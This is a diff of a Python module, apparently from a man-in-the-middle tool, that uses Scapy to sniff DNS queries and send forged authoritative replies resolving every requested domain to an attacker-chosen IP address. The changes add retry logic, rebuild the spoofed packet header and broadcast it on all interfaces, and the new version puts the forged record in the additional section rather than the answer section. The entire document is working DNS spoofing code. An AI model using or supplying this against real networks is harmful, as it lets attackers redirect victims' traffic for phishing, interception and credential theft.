@@ -21,27 +21,36 @@ def stop_sniff(pkt):
 
 def sniffer(fakeip, interfaces):
     """Continous sniff on specified interfaces and sends fakeip to false response"""
-    sniff(prn=lambda pkt: craft_false_response(pkt, fakeip, interfaces),
-          lfilter=lambda pkt: pkt.haslayer(DNSQR),
-          iface=interfaces,
-          stop_filter=stop_sniff)
+    try:
+        pkt = sniff(prn=lambda packet: craft_false_response(packet, fakeip, interfaces),
+                    lfilter=lambda packet: packet.haslayer(DNSQR),
+                    iface=interfaces,
+                    stop_filter=stop_sniff)
+    except IndexError:
+        sniffer(fakeip, interfaces)
 
 
 def craft_false_response(pkt, fakeip, interfaces):
-    if pkt[DNS].qr == 0 and pkt[DNS].opcode == 0:  # It's a DNS request
-        domain = pkt[DNS].qd.qname.decode()
-        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-        udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
-        dns = DNS(
-            id=pkt[DNS].id,
-            qr=1,
-            aa=1,
-            qd=pkt[DNS].qd,
-            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=600, rdata=fakeip)
-        )
-        response = ip / udp / dns
-        sendp(response, verbose=False, iface=pkt.sniffed_on)
-        vprint(f"Sending {pkt[IP].src} false DNS response: {domain} resolved to {fakeip}\n\n")
+    domain = pkt[DNS].qd.qname.decode("utf-8")
+    # print(domain)
+    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+    udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+    dns = DNS(id=pkt[DNS].id,
+              qd=pkt[DNS].qd,
+              aa=1,
+              rd=0,
+              qr=1,
+              qdcount=1,
+              ancount=1,
+              nscount=0,
+              arcount=0,
+              ar=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=600, rdata=fakeip))
+    response = ip / udp / dns
+    for interface in interfaces:
+        send(response, verbose=False, iface=interface)
+    # print(spoofed_response.summary())
+    # print(spoofed_response.show())
+    # print(f"Sending {pkt[IP].src} false DNS response: {domain} resolved to {fakeip}\n\n")
 
 
 def start(fakeip, interfaces, verbose=False):
@@ -51,5 +60,7 @@ def start(fakeip, interfaces, verbose=False):
     dns_thread.start()
 
 
-def stop():
+def stop(verbose=False):
     config["STOP_SNIFFING"] = True
+    vprint("Stopped DNS sniffing and hijacking")
+
